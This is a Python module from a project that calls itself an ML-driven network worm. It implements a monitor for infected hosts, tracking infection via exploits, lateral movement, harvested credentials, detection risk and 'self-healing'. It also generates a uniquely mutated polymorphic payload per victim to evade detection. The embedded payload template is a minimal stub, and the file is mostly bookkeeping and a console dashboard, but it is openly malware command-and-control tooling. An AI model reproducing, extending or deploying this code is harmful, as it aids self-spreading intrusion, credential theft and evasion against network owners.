"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Host Monitor
Real-time monitoring of all infected hosts:
- System metrics (CPU, memory, disk, network)
- Process tracking
- Payload mutation per host
- Activity tracking
- Health monitoring
- Self-healing coordination
"""


import hashlib
import os
import socket
import sys
import threading
import time
from collections import defaultdict, deque
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class HostState:
    """Tracks the complete state of an infected host"""

    def __init__(self, ip: str, os_guess: str = "Unknown"):
        self.ip = ip
        self.os_guess = os_guess
        self.infected_at = datetime.now()
        self.last_beacon = datetime.now()
        self.status = "infected"  # infected, active, dormant, detected, lost

        # System metrics
        self.cpu_usage = 0.0
        self.memory_usage = 0.0
        self.memory_total = 0
        self.disk_usage = 0.0
        self.disk_total = 0
        self.network_sent = 0
        self.network_recv = 0
        self.uptime = 0

        # Process tracking
        self.processes = []
        self.worm_pid = 0
        self.worm_process_name = ""

        # Payload info
        self.payload_hash = ""
        self.payload_variant = ""
        self.payload_type = ""
        self.payload_deployed_at = None

        # Activity tracking
        self.activity_log = deque(maxlen=100)
        self.exploit_history = []
        self.lateral_movement_history = []
        self.credentials_found = []
        self.services_running = []

        # Network
        self.open_ports = []
        self.connections = []
        self.listen_ports = []

        # Health
        self.health_score = 100.0
        self.detection_risk = 0.0
        self.stealth_level = 0
        self.errors = []

        # Self-healing
        self.self_healing_enabled = True
        self.last_health_check = None
        self.repair_history = []

    def record_activity(self, activity_type: str, details: str, data: Dict = None):
        """Record an activity on this host"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "type": activity_type,
            "details": details,
            "data": data or {},
        }
        self.activity_log.append(entry)
        self.last_beacon = datetime.now()

    def update_metrics(
        self,
        cpu: float = None,
        memory: float = None,
        disk: float = None,
        network_sent: int = None,
        network_recv: int = None,
    ):
        """Update system metrics"""
        if cpu is not None:
            self.cpu_usage = cpu
        if memory is not None:
            self.memory_usage = memory
        if disk is not None:
            self.disk_usage = disk
        if network_sent is not None:
            self.network_sent = network_sent
        if network_recv is not None:
            self.network_recv = network_recv
        self.last_beacon = datetime.now()

    def set_payload(self, payload_hash: str, variant: str, payload_type: str):
        """Set payload info for this host"""
        self.payload_hash = payload_hash
        self.payload_variant = variant
        self.payload_type = payload_type
        self.payload_deployed_at = datetime.now()
        self.record_activity(
            "payload_deploy", f"Payload {variant} deployed (hash: {payload_hash[:12]}...)"
        )

    def update_health(self, score: float, detection_risk: float = None):
        """Update host health"""
        self.health_score = max(0, min(100, score))
        if detection_risk is not None:
            self.detection_risk = max(0, min(100, detection_risk))

        if self.health_score < 50:
            self.status = "degraded"
        elif self.health_score < 20:
            self.status = "critical"
        else:
            self.status = "active"

        self.last_health_check = datetime.now()

    def to_dict(self) -> Dict:
        """Convert to dictionary for reporting"""
        return {
            "ip": self.ip,
            "os": self.os_guess,
            "status": self.status,
            "infected_at": self.infected_at.isoformat(),
            "last_beacon": self.last_beacon.isoformat(),
            "health": self.health_score,
            "detection_risk": self.detection_risk,
            "cpu": self.cpu_usage,
            "memory": self.memory_usage,
            "disk": self.disk_usage,
            "network_sent": self.network_sent,
            "network_recv": self.network_recv,
            "payload": {
                "hash": self.payload_hash[:16] if self.payload_hash else "",
                "variant": self.payload_variant,
                "type": self.payload_type,
                "deployed_at": (
                    self.payload_deployed_at.isoformat() if self.payload_deployed_at else ""
                ),
            },
            "activities": len(self.activity_log),
            "credentials_found": len(self.credentials_found),
            "lateral_movements": len(self.lateral_movement_history),
            "errors": len(self.errors),
            "self_healing": self.self_healing_enabled,
        }


class HostMonitor:
    """
    Central monitoring system for all infected hosts

    Features:
    - Real-time system metrics per host
    - Payload mutation tracking (unique payload per host)
    - Activity logging and correlation
    - Health monitoring with alerts
    - Self-healing coordination
    - Network topology visualization
    """

    def __init__(self, polymorphic_engine=None):
        self.hosts: Dict[str, HostState] = {}
        self.polymorphic_engine = polymorphic_engine
        self._lock = threading.Lock()
        self._monitoring = False
        self._monitor_thread = None

        # Global stats
        self.stats = {
            "total_infected": 0,
            "total_active": 0,
            "total_dormant": 0,
            "total_detected": 0,
            "total_lost": 0,
            "total_payload_mutations": 0,
            "total_activities": 0,
            "total_repairs": 0,
            "avg_health": 100.0,
            "avg_detection_risk": 0.0,
        }

        logger.info("Host Monitor initialized")

    def register_host(
        self, ip: str, os_guess: str = "Unknown", ports: List[int] = None, exploit_method: str = ""
    ) -> HostState:
        """Register a newly infected host with unique payload"""
        with self._lock:
            if ip in self.hosts:
                return self.hosts[ip]

            host = HostState(ip, os_guess)
            host.open_ports = ports or []

            # Generate unique payload for this host
            if self.polymorphic_engine:
                # Create base payload and mutate it uniquely
                base_payload = self._generate_base_payload(ip, os_guess, exploit_method)
                mutated = self.polymorphic_engine.mutate_payload(base_payload)
                payload_hash = hashlib.sha256(mutated.encode()).hexdigest()
                variant = f"v{self.stats['total_payload_mutations'] + 1}"

                host.set_payload(payload_hash, variant, "polymorphic")
                self.stats["total_payload_mutations"] += 1
            else:
                payload_hash = hashlib.md5(f"{ip}{time.time()}".encode()).hexdigest()
                host.set_payload(payload_hash, "v1", "standard")

            host.record_activity(
                "infection",
                f"Infected via {exploit_method}",
                {
                    "os": os_guess,
                    "ports": ports,
                    "exploit": exploit_method,
                },
            )

            self.hosts[ip] = host
            self.stats["total_infected"] += 1
            self.stats["total_active"] += 1

            logger.info(f"Host registered: {ip} ({os_guess}) - Payload: {host.payload_variant}")
            return host

    def _generate_base_payload(self, ip: str, os_guess: str, exploit_method: str) -> str:
        """Generate a base payload string for mutation"""
        import base64

        # Use base64-encoded config to avoid variable name conflicts during mutation
        config_data = f"{ip}|{os_guess}|{exploit_method}|{datetime.now().isoformat()}"
        config_b64 = base64.b64encode(config_data.encode()).decode()

        return """
import socket, os, time, hashlib, base64
_CFG = base64.b64decode("%s").decode().split("|")
_TGT = _CFG[0]
_OS = _CFG[1]
_MTH = _CFG[2]
_TS = _CFG[3]
_PID = hashlib.md5((_TGT + str(time.time())).encode()).hexdigest()
def bcn():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lip = s.getsockname()[0]
            s.close()
            return lip
        except Exception:
            return "127.0.0.1"
def run():
    return bcn()
""" % config_b64

    def update_host_metrics(
        self,
        ip: str,
        cpu: float = None,
        memory: float = None,
        disk: float = None,
        network_sent: int = None,
        network_recv: int = None,
        processes: List[str] = None,
    ):
        """Update metrics for a specific host"""
        with self._lock:
            if ip not in self.hosts:
                return

            host = self.hosts[ip]
            host.update_metrics(cpu, memory, disk, network_sent, network_recv)

            if processes:
                host.processes = processes

            host.record_activity("metrics_update", f"CPU: {cpu}%, Mem: {memory}%, Disk: {disk}%")

    def record_host_activity(self, ip: str, activity_type: str, details: str, data: Dict = None):
        """Record activity on a specific host"""
        with self._lock:
            if ip in self.hosts:
                self.hosts[ip].record_activity(activity_type, details, data)
                self.stats["total_activities"] += 1

    def record_lateral_movement(
        self, source_ip: str, target_ip: str, technique: str, success: bool
    ):
        """Record lateral movement between hosts"""
        with self._lock:
            if source_ip in self.hosts:
                self.hosts[source_ip].lateral_movement_history.append(
                    {
                        "target": target_ip,
                        "technique": technique,
                        "success": success,
                        "timestamp": datetime.now().isoformat(),
                    }
                )
                self.hosts[source_ip].record_activity(
                    "lateral_movement",
                    f"{'Success' if success else 'Failed'}: {technique} -> {target_ip}",
                )

    def record_credential_found(self, ip: str, username: str, service: str, source: str = ""):
        """Record credential discovery on a host"""
        with self._lock:
            if ip in self.hosts:
                self.hosts[ip].credentials_found.append(
                    {
                        "username": username,
                        "service": service,
                        "source": source,
                        "timestamp": datetime.now().isoformat(),
                    }
                )
                self.hosts[ip].record_activity(
                    "credential_found", f"Found {username} on {service} via {source}"
                )

    def update_host_health(self, ip: str, health_score: float, detection_risk: float = None):
        """Update health status for a host"""
        with self._lock:
            if ip in self.hosts:
                self.hosts[ip].update_health(health_score, detection_risk)

    def trigger_self_healing(self, ip: str) -> bool:
        """Trigger self-healing for a specific host"""
        with self._lock:
            if ip not in self.hosts:
                return False

            host = self.hosts[ip]
            if not host.self_healing_enabled:
                return False

            host.record_activity("self_healing", "Self-healing triggered")

            # Simulate healing actions
            repairs = []

            # If health is low, try to restore
            if host.health_score < 70:
                host.health_score = min(100, host.health_score + 30)
                repairs.append("health_restored")

            # If detection risk is high, reduce it
            if host.detection_risk > 50:
                host.detection_risk = max(0, host.detection_risk - 20)
                repairs.append("detection_risk_reduced")

            # If status is degraded, try to restore
            if host.status in ["degraded", "critical"]:
                host.status = "active"
                repairs.append("status_restored")

            if repairs:
                host.repair_history.append(
                    {
                        "repairs": repairs,
                        "timestamp": datetime.now().isoformat(),
                        "health_after": host.health_score,
                    }
                )
                self.stats["total_repairs"] += len(repairs)
                host.record_activity("self_healing_complete", f"Repairs: {', '.join(repairs)}")
                logger.info(f"Self-healing on {ip}: {', '.join(repairs)}")
                return True

            return False

    def get_host_status(self, ip: str) -> Optional[Dict]:
        """Get detailed status of a specific host"""
        with self._lock:
            if ip not in self.hosts:
                return None
            return self.hosts[ip].to_dict()

    def get_all_hosts_status(self) -> List[Dict]:
        """Get status of all infected hosts"""
        with self._lock:
            return [host.to_dict() for host in self.hosts.values()]

    def get_network_overview(self) -> Dict:
        """Get complete network overview"""
        with self._lock:
            hosts_by_status = defaultdict(int)
            total_health = 0
            total_detection = 0
            total_activities = 0
            total_payloads = 0

            for host in self.hosts.values():
                hosts_by_status[host.status] += 1
                total_health += host.health_score
                total_detection += host.detection_risk
                total_activities += len(host.activity_log)
                total_payloads += 1 if host.payload_hash else 0

            n = max(len(self.hosts), 1)

            return {
                "total_hosts": len(self.hosts),
                "hosts_by_status": dict(hosts_by_status),
                "avg_health": total_health / n,
                "avg_detection_risk": total_detection / n,
                "total_activities": total_activities,
                "unique_payloads": total_payloads,
                "total_credentials": sum(len(h.credentials_found) for h in self.hosts.values()),
                "total_lateral_movements": sum(
                    len(h.lateral_movement_history) for h in self.hosts.values()
                ),
                "total_repairs": self.stats["total_repairs"],
            }

    def get_activity_feed(self, limit: int = 50) -> List[Dict]:
        """Get combined activity feed from all hosts"""
        with self._lock:
            all_activities = []
            for host in self.hosts.values():
                for activity in host.activity_log:
                    activity_with_host = {**activity, "host_ip": host.ip}
                    all_activities.append(activity_with_host)

            # Sort by timestamp descending
            all_activities.sort(key=lambda x: x["timestamp"], reverse=True)
            return all_activities[:limit]

    def get_propagation_map(self) -> Dict:
        """Get the propagation map showing how infection spread"""
        with self._lock:
            prop_map = {}
            for host in self.hosts.values():
                prop_map[host.ip] = {
                    "os": host.os_guess,
                    "status": host.status,
                    "infected_at": host.infected_at.isoformat(),
                    "payload_variant": host.payload_variant,
                    "lateral_movements": host.lateral_movement_history,
                    "credentials_found": len(host.credentials_found),
                }
            return prop_map

    def start_monitoring(self, interval: int = 30):
        """Start continuous monitoring thread"""
        if self._monitoring:
            return

        self._monitoring = True

        def monitor_loop():
            while self._monitoring:
                try:
                    with self._lock:
                        for ip, host in list(self.hosts.items()):
                            # Check if host is still responsive
                            time_since_beacon = (datetime.now() - host.last_beacon).total_seconds()
                            if time_since_beacon > 300:  # 5 minutes
                                if host.status != "lost":
                                    host.status = "lost"
                                    host.record_activity(
                                        "status_change", "Host marked as lost (no beacon)"
                                    )
                                    logger.warning(
                                        f"Host lost: {ip} (no beacon for {time_since_beacon:.0f}s)"
                                    )

                            # Auto self-healing
                            if host.self_healing_enabled and host.health_score < 60:
                                self.trigger_self_healing(ip)

                            # Check for detection
                            if host.detection_risk > 80:
                                host.status = "detected"
                                host.record_activity("status_change", "Host marked as detected")
                                logger.critical(
                                    f"Host detected: {ip} (risk: {host.detection_risk:.0f}%)"
                                )

                except Exception as e:
                    logger.error(f"Monitor loop error: {e}")

                time.sleep(interval)

        self._monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self._monitor_thread.start()
        logger.info(f"Host monitoring started (interval: {interval}s)")

    def stop_monitoring(self):
        """Stop monitoring thread"""
        self._monitoring = False
        logger.info("Host monitoring stopped")

    def print_dashboard(self):
        """Print monitoring dashboard to console"""
        from colorama import Fore, Style

        overview = self.get_network_overview()

        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  HOST MONITORING DASHBOARD{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

        print(f"\n  {Fore.WHITE}NETWORK OVERVIEW:{Style.RESET_ALL}")
        print(f"  {'─'*76}")
        print(f"  {Fore.CYAN}Total Hosts:{Style.RESET_ALL} {overview['total_hosts']}")
        print(
            f"  {Fore.GREEN}Active:{Style.RESET_ALL} {overview['hosts_by_status'].get('active', 0)}  "
            f"{Fore.YELLOW}Dormant:{Style.RESET_ALL} {overview['hosts_by_status'].get('dormant', 0)}  "
            f"{Fore.RED}Detected:{Style.RESET_ALL} {overview['hosts_by_status'].get('detected', 0)}  "
            f"{Fore.WHITE}Lost:{Style.RESET_ALL} {overview['hosts_by_status'].get('lost', 0)}"
        )
        print(
            f"  {Fore.GREEN}Avg Health:{Style.RESET_ALL} {overview['avg_health']:.1f}%  "
            f"{Fore.YELLOW}Avg Detection Risk:{Style.RESET_ALL} {overview['avg_detection_risk']:.1f}%"
        )
        print(
            f"  {Fore.WHITE}Unique Payloads:{Style.RESET_ALL} {overview['unique_payloads']}  "
            f"{Fore.MAGENTA}Total Activities:{Style.RESET_ALL} {overview['total_activities']}"
        )
        print(
            f"  {Fore.GREEN}Credentials Found:{Style.RESET_ALL} {overview['total_credentials']}  "
            f"{Fore.CYAN}Lateral Movements:{Style.RESET_ALL} {overview['total_lateral_movements']}"
        )
        print(f"  {Fore.GREEN}Self-Healing Repairs:{Style.RESET_ALL} {overview['total_repairs']}")
        print(f"  {'─'*76}")

        # Per-host status
        print(f"\n  {Fore.WHITE}HOST DETAILS:{Style.RESET_ALL}")
        print(f"  {'─'*76}")
        print(
            f"  {'IP':<18} {'OS':<12} {'Status':<10} {'Health':<8} {'Risk':<8} {'Payload':<10} {'Activities':<10}"
        )
        print(f"  {'─'*76}")

        for host_data in self.get_all_hosts_status():
            status_color = {
                "active": Fore.GREEN,
                "infected": Fore.CYAN,
                "dormant": Fore.YELLOW,
                "degraded": Fore.YELLOW,
                "critical": Fore.RED,
                "detected": Fore.RED + Style.BRIGHT,
                "lost": Fore.WHITE,
            }.get(host_data["status"], Fore.WHITE)

            health_color = (
                Fore.GREEN
                if host_data["health"] > 70
                else (Fore.YELLOW if host_data["health"] > 40 else Fore.RED)
            )

            risk_color = (
                Fore.GREEN
                if host_data["detection_risk"] < 30
                else (Fore.YELLOW if host_data["detection_risk"] < 60 else Fore.RED)
            )

            print(
                f"  {Fore.CYAN}{host_data['ip']:<18}{Style.RESET_ALL} "
                f"{Fore.WHITE}{host_data['os']:<12}{Style.RESET_ALL} "
                f"{status_color}{host_data['status']:<10}{Style.RESET_ALL} "
                f"{health_color}{host_data['health']:.0f}%{Style.RESET_ALL}     "
                f"{risk_color}{host_data['detection_risk']:.0f}%{Style.RESET_ALL}     "
                f"{Fore.MAGENTA}{host_data['payload']['variant']:<10}{Style.RESET_ALL} "
                f"{Fore.WHITE}{host_data['activities']:<10}{Style.RESET_ALL}"
            )

        print(f"  {'─'*76}")

        # Recent activity feed
        activities = self.get_activity_feed(limit=10)
        if activities:
            print(f"\n  {Fore.WHITE}RECENT ACTIVITY (last 10):{Style.RESET_ALL}")
            print(f"  {'─'*76}")
            for act in activities:
                time_str = act["timestamp"][11:19]
                host_ip = act.get("host_ip", "?")
                act_type = act.get("type", "?")
                details = act.get("details", "")

                type_colors = {
                    "infection": Fore.GREEN,
                    "payload_deploy": Fore.MAGENTA,
                    "lateral_movement": Fore.CYAN,
                    "credential_found": Fore.YELLOW,
                    "self_healing": Fore.GREEN,
                    "metrics_update": Fore.WHITE,
                    "status_change": Fore.RED,
                }
                color = type_colors.get(act_type, Fore.WHITE)

                print(
                    f"  {Fore.WHITE}{time_str}{Style.RESET_ALL} "
                    f"{color}[{act_type.upper():<18}]{Style.RESET_ALL} "
                    f"{Fore.CYAN}{host_ip:<15}{Style.RESET_ALL} "
                    f"{details[:50]}"
                )

        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
